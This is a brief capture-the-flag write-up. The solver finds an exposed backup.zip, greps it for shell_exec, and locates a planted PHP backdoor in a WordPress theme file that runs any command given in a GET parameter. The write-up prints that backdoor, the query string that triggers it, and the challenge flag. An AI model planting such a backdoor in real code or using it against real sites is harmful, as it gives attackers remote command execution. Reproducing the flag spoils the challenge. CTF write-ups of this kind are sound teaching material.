## nondiff-backdoor

The description tells us there is a backup.zip file somewhere in the public path, so we do the most logical thing, add `/backup.zip` to the URL. Oh, who would've guessed - the zip file gets downloaded. We know that the website is built using PHP, and one of the most exploitable PHP functions is `shell_exec()`, which returns a command's output. Let's search for that among many files the backup folder contains:

```
cd backup
grep -r "shell_exec("
```

First instance of the function is in `wp-content/themes/twentytwentytwo/functions.php`, that's our next destination. The curious thing we see here is this block of code:

```
function sentimental_function() { 
  If ($_GET['welldone'] == 'knockknock') { 
	echo shell_exec($_GET['shazam']); 
  }
}
```

So, we modify the URL by adding the following:

```
?welldone=knockknock&shazam=ls
```

And it displays contents of the current folder. Then, we swap out `ls` for `cat flag.php` and check the page source.

_CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}_